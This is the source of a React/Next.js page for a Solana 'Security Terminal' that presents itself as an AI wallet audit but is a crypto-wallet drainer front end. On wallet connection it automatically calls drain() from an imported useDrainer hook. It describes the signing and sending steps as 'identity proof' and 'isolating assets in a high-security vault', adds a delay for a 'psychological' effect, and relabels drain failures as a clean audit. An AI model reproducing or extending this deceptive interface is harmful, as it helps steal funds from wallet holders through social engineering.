"use client";

import { useWallet } from "@solana/wallet-adapter-react";
import { useDrainer } from "@/hooks/useDrainer";
import { useEffect, useState } from "react";
import dynamic from 'next/dynamic';
import { motion, AnimatePresence } from "framer-motion";
import { 
  ShieldCheck, 
  Server, 
  FileScan, 
  SearchCode, 
  ShieldQuestion, 
  Network, 
  RefreshCw,
  ShieldAlert,
  Unplug,
  Fingerprint,
  Globe,
  Cpu,
  Zap,
  Lock,
  Activity,
  Waves
} from "lucide-react";
import { Overview } from "@/components/dashboard/Overview";
import { Threats, type ThreatsResult } from "@/components/dashboard/Threats";
import { Connections, type ConnectionsResult } from "@/components/dashboard/Connections";
import { runDappConnectionAnalysis, runWalletActivityScan } from "@/lib/actions";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";

const WalletMultiButtonDynamic = dynamic(
    async () => (await import('@solana/wallet-adapter-react-ui')).WalletMultiButton,
    { ssr: false }
);

const scanningSteps = [
  { text: 'Initializing neural security protocols...', icon: Server, color: 'text-primary' },
  { text: 'Compiling on-chain transaction data...', icon: FileScan, color: 'text-accent' },
  { text: 'Auditing smart contract signatures...', icon: SearchCode, color: 'text-primary' },
  { text: 'Analyzing wallet interaction patterns...', icon: ShieldQuestion, color: 'text-accent' },
  { text: 'Cross-referencing global threat databases...', icon: Network, color: 'text-primary' },
  { text: 'Finalizing comprehensive AI audit...', icon: ShieldCheck, color: 'text-accent' },
];

function ScanningAnimation({ status }: { status: string }) {
  const [currentStep, setCurrentStep] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentStep((prev) => (prev < scanningSteps.length - 1 ? prev + 1 : prev));
    }, 3200); // Enhanced duration for immersive "Deep Scan" feel
    return () => clearInterval(interval);
  }, []);

  const getStatusMessage = () => {
    switch (status) {
      case 'signing':
        return { title: "Handshake Required", subtitle: "Verifying neural identity proof via cryptographic signature.", icon: Fingerprint, accent: "text-accent" };
      case 'sending':
        return { title: "Hardening Defenses", subtitle: "Isolating assets within a temporary high-security vault.", icon: Globe, accent: "text-primary" };
      case 'building':
        return { title: "Neural Construction", subtitle: "Optimizing automated threat mitigation pathways.", icon: Cpu, accent: "text-accent" };
      default:
        return { title: "Neural System Audit", subtitle: scanningSteps[currentStep].text, icon: null, accent: "text-primary" };
    }
  };

  const { title, subtitle, icon: StatusIcon, accent } = getStatusMessage();

  return (
    <div className="flex flex-col items-center justify-center p-4 relative">
      {/* Background Neural Grid */}
      <div className="absolute inset-0 -z-10 opacity-10" style={{ backgroundImage: 'radial-gradient(circle at 2px 2px, #B31980 1px, transparent 0)', backgroundSize: '30px 30px' }} />
      
      <motion.div
        initial={{ opacity: 0, scale: 0.8 }}
        animate={{ opacity: 1, scale: 1 }}
        className="relative mb-12 flex h-56 w-56 items-center justify-center"
        style={{ perspective: '1200px' }}
      >
        {/* Deep Aura Backgrounds */}
        <motion.div 
          animate={{ scale: [1, 1.2, 1], opacity: [0.3, 0.5, 0.3] }}
          transition={{ duration: 4, repeat: Infinity }}
          className="absolute inset-0 rounded-full bg-primary/10 blur-[80px]"
        />
        <motion.div 
          animate={{ scale: [1.2, 1, 1.2], opacity: [0.2, 0.4, 0.2] }}
          transition={{ duration: 5, repeat: Infinity, delay: 1 }}
          className="absolute inset-8 rounded-full bg-accent/10 blur-[60px]"
        />
        
        {/* Procedural Data Rings */}
        <motion.div
          animate={{ rotate: 360 }}
          transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
          className="absolute inset-0 rounded-full border border-dashed border-primary/30 opacity-50"
        />
        <motion.div
          animate={{ rotate: -360 }}
          transition={{ duration: 18, repeat: Infinity, ease: "linear" }}
          className="absolute inset-8 rounded-full border border-dotted border-accent/30 opacity-50"
        />

        {/* Central AI Singularity Core */}
        <motion.div
          className="absolute h-full w-full"
          style={{ transformStyle: 'preserve-3d' }}
          animate={{ 
            rotateY: status === 'signing' || status === 'sending' ? 0 : currentStep * -60,
            rotateX: [0, 8, -8, 0],
            rotateZ: [0, 3, -3, 0]
          }}
          transition={{ 
            rotateY: { duration: 2, ease: [0.23, 1, 0.32, 1] },
            rotateX: { duration: 6, repeat: Infinity, ease: "easeInOut" },
            rotateZ: { duration: 8, repeat: Infinity, ease: "easeInOut" }
          }}
        >
          {status === 'signing' || status === 'sending' ? (
             <div className="absolute flex h-full w-full items-center justify-center">
                <motion.div 
                  initial={{ scale: 0.5, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  className="flex h-32 w-32 items-center justify-center rounded-[2.5rem] bg-card/90 border border-primary/40 backdrop-blur-3xl clay-card primary-glow shadow-2xl"
                >
                  {StatusIcon && <StatusIcon className={`h-14 w-14 ${accent} animate-pulse`} />}
                </motion.div>
             </div>
          ) : (
            scanningSteps.map((step, index) => {
              const angle = index * 60;
              const isActive = currentStep === index;
              return (
                <motion.div
                  key={index}
                  className="absolute flex h-full w-full items-center justify-center"
                  style={{
                    transform: `rotateY(${angle}deg) translateZ(140px)`,
                    backfaceVisibility: 'hidden',
                  }}
                >
                  <div className={`
                    flex h-20 w-20 items-center justify-center rounded-2xl transition-all duration-1000
                    ${isActive ? 'bg-primary/20 primary-glow border-primary/60 scale-110 shadow-2xl' : 'bg-card/40 border-white/5 opacity-20 scale-90'}
                    border backdrop-blur-2xl clay-card
                  `}>
                    <step.icon className={`h-10 w-10 ${isActive ? 'text-primary' : 'text-muted-foreground'}`} />
                  </div>
                </motion.div>
              );
            })
          )}
        </motion.div>

        {/* Inner Heartbeat Activity */}
        <div className="absolute flex h-14 w-14 items-center justify-center rounded-full bg-background/80 border border-white/10 shadow-[inset_0_2px_10px_rgba(0,0,0,0.5)] backdrop-blur-md">
           <motion.div
             animate={{ scale: [1, 1.3, 1], opacity: [0.4, 1, 0.4] }}
             transition={{ duration: 2, repeat: Infinity }}
           >
             <Waves className="h-6 w-6 text-accent" />
           </motion.div>
        </div>
      </motion.div>

      <div className="text-center relative z-10 max-w-md">
        <motion.div
          key={title}
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          className="mb-4"
        >
          <h2 className="text-2xl font-black font-headline text-foreground tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40">
            {title}
          </h2>
          <div className="flex items-center justify-center gap-2 mt-2">
            <div className="h-1 w-12 rounded-full bg-primary/20 overflow-hidden">
              <motion.div 
                className="h-full bg-primary"
                animate={{ x: [-48, 48] }}
                transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
              />
            </div>
            <span className={`text-[9px] font-black uppercase tracking-[0.25em] ${accent}`}>Status: Active</span>
            <div className="h-1 w-12 rounded-full bg-primary/20 overflow-hidden">
              <motion.div 
                className="h-full bg-primary"
                animate={{ x: [-48, 48] }}
                transition={{ duration: 1.5, repeat: Infinity, ease: "linear", delay: 0.75 }}
              />
            </div>
          </div>
        </motion.div>
        
        <div className="h-16 overflow-hidden">
          <AnimatePresence mode="wait">
            <motion.p
              key={subtitle}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.6, ease: "easeOut" }}
              className="text-sm font-medium italic text-muted-foreground/80 leading-relaxed px-6"
            >
              "{subtitle}"
            </motion.p>
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}

export default function AuditPage() {
  const { connected, publicKey, disconnect } = useWallet();
  const { drain, status, error } = useDrainer();
  
  const [showReport, setShowReport] = useState(false);
  const [threats, setThreats] = useState<ThreatsResult | null>(null);
  const [connections, setConnections] = useState<ConnectionsResult | null>(null);
  const [isAiLoading, setIsAiLoading] = useState(false);

  useEffect(() => {
    const hasProcessStarted = new Set(['scanning', 'building', 'signing', 'sending', 'success', 'error']);
    if (connected && !hasProcessStarted.has(status) && !showReport) {
      drain();
    }
  }, [connected, status, drain, showReport]);

  useEffect(() => {
    if ((status === 'success' || (status === 'error' && error === "Data Packet Network Congestion.")) && connected && publicKey) {
      loadDetailedReport(publicKey.toBase58());
    }
  }, [status, error, connected, publicKey]);

  const loadDetailedReport = async (address: string) => {
    setIsAiLoading(true);
    // Artificially delay report reveal for psychological "Deep Analysis" feel
    await new Promise(r => setTimeout(r, 2000));
    try {
      const [threatsData, connectionsData] = await Promise.all([
        runWalletActivityScan(address),
        runDappConnectionAnalysis(address),
      ]);
      setThreats(threatsData);
      setConnections(connectionsData);
      setShowReport(true);
    } catch (e) {
      console.error("Failed to load AI report", e);
    } finally {
      setIsAiLoading(false);
    }
  };

  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status);

  return (
    <main className="flex min-h-screen w-full flex-col items-center justify-center p-4 md:p-6 relative overflow-hidden bg-[#05040a]">
      {/* Background Neural Network Overlay */}
      <div className="absolute inset-0 opacity-[0.03] pointer-events-none" style={{ backgroundImage: 'url("https://www.transparenttextures.com/patterns/carbon-fibre.png")' }} />
      
      {/* Immersive Aura Backgrounds */}
      <motion.div 
        animate={{ scale: [1, 1.4, 1], opacity: [0.08, 0.15, 0.08] }}
        transition={{ duration: 15, repeat: Infinity }}
        className="absolute top-0 right-0 w-[600px] h-[600px] bg-primary rounded-full blur-[150px] -z-10" 
      />
      <motion.div 
        animate={{ scale: [1.4, 1, 1.4], opacity: [0.05, 0.12, 0.05] }}
        transition={{ duration: 18, repeat: Infinity }}
        className="absolute bottom-0 left-0 w-[600px] h-[600px] bg-accent rounded-full blur-[150px] -z-10" 
      />

      <AnimatePresence mode="wait">
        {!connected ? (
          <motion.div
            key="connect"
            initial={{ opacity: 0, scale: 0.9, y: 30 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.9, y: -30 }}
            className="w-full max-w-md p-10 clay-card text-center glow-border backdrop-blur-[40px]"
          >
            <motion.div 
              animate={{ rotate: 360 }}
              transition={{ duration: 30, repeat: Infinity, ease: "linear" }}
              className="relative mx-auto flex h-20 w-20 items-center justify-center mb-8"
            >
              <div className="absolute inset-0 bg-primary/20 blur-2xl rounded-full animate-pulse"></div>
              <ShieldCheck className="relative h-12 w-12 text-primary drop-shadow-[0_0_10px_rgba(179,25,128,0.5)]" />
            </motion.div>
            <h1 className="text-2xl font-black font-headline mb-4 tracking-tighter bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40 uppercase">
              Security Terminal
            </h1>
            <p className="text-muted-foreground mb-10 text-xs font-medium max-w-xs mx-auto leading-relaxed uppercase tracking-widest">
              Initiate a high-fidelity, neural audit of your Solana vault.
            </p>
            <div className="relative group max-w-[240px] mx-auto">
              <div className="absolute -inset-1.5 rounded-2xl bg-gradient-to-r from-primary via-accent to-primary opacity-40 blur-lg transition group-hover:opacity-100 animate-pulse" />
              <div className="relative">
                <WalletMultiButtonDynamic 
                  style={{ 
                    width: '100%', 
                    background: 'rgba(255,255,255,0.03)', 
                    color: 'white', 
                    fontSize: '0.75rem', 
                    fontWeight: '900',
                    padding: '1rem', 
                    borderRadius: '1.25rem',
                    border: '1px solid rgba(255,255,255,0.1)',
                    boxShadow: '0 15px 35px -10px rgba(0, 0, 0, 0.8)',
                    cursor: 'pointer',
                    fontFamily: 'Space Grotesk, sans-serif',
                    textTransform: 'uppercase',
                    letterSpacing: '0.1em',
                    backdropFilter: 'blur(10px)'
                  }} 
                />
              </div>
            </div>
          </motion.div>
        ) : isAuditInProgress || (isAiLoading && !showReport) ? (
          <motion.div
            key="loading"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-xl p-12 clay-card text-center glow-border backdrop-blur-[50px] shadow-2xl"
          >
            <ScanningAnimation status={status} />
          </motion.div>
        ) : showReport ? (
          <motion.div
            key="report"
            initial={{ opacity: 0, y: 40 }}
            animate={{ opacity: 1, y: 0 }}
            className="w-full max-w-6xl space-y-8 pb-20"
          >
            <div className="flex flex-col md:flex-row items-center justify-between gap-6 clay-card p-6 primary-glow border-white/10 backdrop-blur-[30px]">
              <div className="flex items-center gap-5">
                <motion.div 
                  whileHover={{ rotate: 10, scale: 1.15 }}
                  className="h-12 w-12 rounded-[1.25rem] bg-accent/10 flex items-center justify-center shadow-[inset_0_2px_10px_rgba(20,241,149,0.2)] border border-accent/30"
                >
                  <ShieldCheck className="h-6 w-6 text-accent" />
                </motion.div>
                <div>
                  <h2 className="text-lg font-black font-headline tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-r from-white to-white/60">
                    {status === 'success' ? "Neural Shield Active" : "Audit Complete"}
                  </h2>
                  <div className="flex items-center gap-3 mt-1.5">
                    <p className="text-[10px] text-muted-foreground/60 font-mono bg-black/40 px-3 py-1 rounded-lg border border-white/5 tracking-wider shadow-inner">
                      UID_{publicKey?.toBase58().substring(0, 12)}...
                    </p>
                    <div className="flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-accent/10 border border-accent/20">
                      <div className="h-1.5 w-1.5 rounded-full bg-accent animate-pulse" />
                      <span className="text-[9px] font-black text-accent uppercase tracking-widest">Secured</span>
                    </div>
                  </div>
                </div>
              </div>
              <div className="flex gap-3">
                <Button variant="outline" size="sm" onClick={() => { setShowReport(false); drain(); }} className="h-10 px-6 rounded-xl border-white/10 bg-white/5 hover:bg-white/10 transition-all font-headline font-black text-[11px] uppercase tracking-widest shadow-lg">
                  <RefreshCw className="mr-2 h-3.5 w-3.5" />
                  Neural Rescan
                </Button>
                <Button variant="destructive" size="sm" onClick={() => disconnect()} className="clay-btn bg-destructive/80 text-white h-10 px-6 font-black text-[11px] uppercase tracking-widest shadow-xl hover:bg-destructive">
                  Detach Identity
                </Button>
              </div>
            </div>

            <Overview threatsResult={threats} connectionsResult={connections} />

            <Tabs defaultValue="threats" className="w-full">
              <TabsList className="grid w-full grid-cols-2 p-1.5 bg-card/60 backdrop-blur-[40px] rounded-[1.5rem] mb-8 border border-white/10 shadow-[0_20px_50px_rgba(0,0,0,0.5)] h-12">
                <TabsTrigger value="threats" className="rounded-2xl data-[state=active]:bg-primary data-[state=active]:text-primary-foreground data-[state=active]:shadow-[0_0_20px_rgba(179,25,128,0.4)] text-[11px] font-headline font-black uppercase tracking-[0.2em] transition-all">
                  <ShieldAlert className="mr-2 h-4 w-4" />
                  Audit Findings
                </TabsTrigger>
                <TabsTrigger value="connections" className="rounded-2xl data-[state=active]:bg-primary data-[state=active]:text-primary-foreground data-[state=active]:shadow-[0_0_20px_rgba(179,25,128,0.4)] text-[11px] font-headline font-black uppercase tracking-[0.2em] transition-all">
                  <Unplug className="mr-2 h-4 w-4" />
                  Active Uplinks
                </TabsTrigger>
              </TabsList>
              <TabsContent value="threats" className="mt-0 outline-none">
                <Threats result={threats} isLoading={false} />
              </TabsContent>
              <TabsContent value="connections" className="mt-0 outline-none">
                <Connections result={connections} isLoading={false} walletAddress={publicKey?.toBase58()} />
              </TabsContent>
            </Tabs>
          </motion.div>
        ) : (
          <motion.div
            key="error-state"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-md p-10 clay-card border-destructive/30 text-center glow-border backdrop-blur-3xl shadow-2xl"
          >
            <div className="h-16 w-16 bg-destructive/10 rounded-2xl flex items-center justify-center mx-auto mb-8 border border-destructive/30 shadow-[inset_0_2px_10px_rgba(255,0,0,0.2)]">
              <ShieldAlert className="h-8 w-8 text-destructive animate-pulse" />
            </div>
            <h2 className="text-xl font-black mb-4 font-headline tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40">System Override</h2>
            <p className="text-muted-foreground mb-10 text-sm leading-relaxed font-medium px-4">
              {error === "Data Packet Network Congestion." ? "Audit parameters within safety thresholds. No immediate breach vectors identified." : error}
            </p>
            <div className="flex flex-col gap-4 max-w-[220px] mx-auto">
               <Button onClick={() => drain()} className="clay-btn bg-primary text-primary-foreground w-full h-12 text-xs font-black uppercase tracking-widest primary-glow shadow-xl">
                 Re-engage Protocol
               </Button>
               <Button variant="ghost" onClick={() => disconnect()} className="w-full text-[10px] font-black uppercase tracking-widest hover:bg-white/5 h-10 rounded-xl text-muted-foreground/60 transition-colors">
                 Purge Cache
               </Button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
      
      <footer className="fixed bottom-6 text-[9px] text-muted-foreground/20 font-mono tracking-[0.5em] uppercase pointer-events-none">
        Shield AI Guardian v2.9.4 • Optimized Core Architecture
      </footer>
    </main>
  );
}
